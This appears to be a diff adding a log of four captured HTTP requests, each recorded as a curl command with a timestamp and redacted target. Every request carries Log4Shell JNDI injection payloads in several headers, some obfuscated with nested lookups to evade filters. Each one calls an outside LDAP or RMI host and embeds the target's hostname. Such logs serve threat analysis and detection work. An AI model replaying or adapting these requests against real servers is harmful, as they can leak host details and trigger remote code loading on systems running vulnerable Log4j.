@@ -1,0 +1,32 @@
+
+
+Trigger template: null
+Protocol: http
+Timestamp: 2022-01-26T19:46:54.759337854Z
+Adress: REDACTED
+Curl command:
+curl -X 'GET' -d '' -H 'Authentication: ${${lower:jndi}:${lower:rmi}://${hostName}.REDACTED/poc}' -H 'Host: REDACTED:8080' -H 'Referer: ${${lower:jndi}:${lower:rmi}://${hostName}.REDACTED/poc}' -H 'User-Agent: ${${lower:jndi}:${lower:rmi}://${hostName}.REDACTED/poc}' -H 'X-Api-Version: ${${lower:jndi}:${lower:rmi}://${hostName}.REDACTED/poc}' -H 'X-Forwarded-For: ${${lower:jndi}:${lower:rmi}://${hostName}.REDACTED/poc}' 'http://REDACTED:8080/'
+
+
+Trigger template: null
+Protocol: http
+Timestamp: 2022-01-26T19:46:54.766936485Z
+Adress: REDACTED
+Curl command:
+curl -X 'GET' -d '' -H 'Authentication: ${${::-j}ndi:rmi://${hostName}.REDACTED/ass}' -H 'Host: REDACTED:8080' -H 'Referer: ${${::-j}ndi:rmi://${hostName}.REDACTED/ass}' -H 'User-Agent: ${${::-j}ndi:rmi://${hostName}.REDACTED/ass}' -H 'X-Api-Version: ${${::-j}ndi:rmi://${hostName}.REDACTED/ass}' -H 'X-Forwarded-For: ${${::-j}ndi:rmi://${hostName}.REDACTED/ass}' 'http://REDACTED:8080/'
+
+
+Trigger template: null
+Protocol: http
+Timestamp: 2022-01-26T19:46:54.770546118Z
+Adress: REDACTED
+Curl command:
+curl -X 'GET' -d '' -H 'Authentication: ${${lower:${lower:jndi}}:${lower:rmi}://${hostName}.REDACTED/poc}' -H 'Host: REDACTED:8080' -H 'Referer: ${${lower:${lower:jndi}}:${lower:rmi}://${hostName}.REDACTED/poc}' -H 'User-Agent: ${${lower:${lower:jndi}}:${lower:rmi}://${hostName}.REDACTED/poc}' -H 'X-Api-Version: ${${lower:${lower:jndi}}:${lower:rmi}://${hostName}.REDACTED/poc}' -H 'X-Forwarded-For: ${${lower:${lower:jndi}}:${lower:rmi}://${hostName}.REDACTED/poc}' 'http://REDACTED:8080/'
+
+
+Trigger template: null
+Protocol: http
+Timestamp: 2022-01-26T19:46:54.773997379Z
+Adress: REDACTED
+Curl command:
+curl -X 'GET' -d '' -H 'Authentication: ${jndi:ldap://${hostName}.REDACTED/badClassName}' -H 'Host: REDACTED:8080' -H 'Referer: ${jndi:ldap://${hostName}.REDACTED/badClassName}' -H 'User-Agent: ${jndi:ldap://${hostName}.REDACTED/badClassName}' -H 'X-Api-Version: ${jndi:ldap://${hostName}.REDACTED/badClassName}' -H 'X-Forwarded-For: ${jndi:ldap://${hostName}.REDACTED/badClassName}' 'http://REDACTED:8080/'
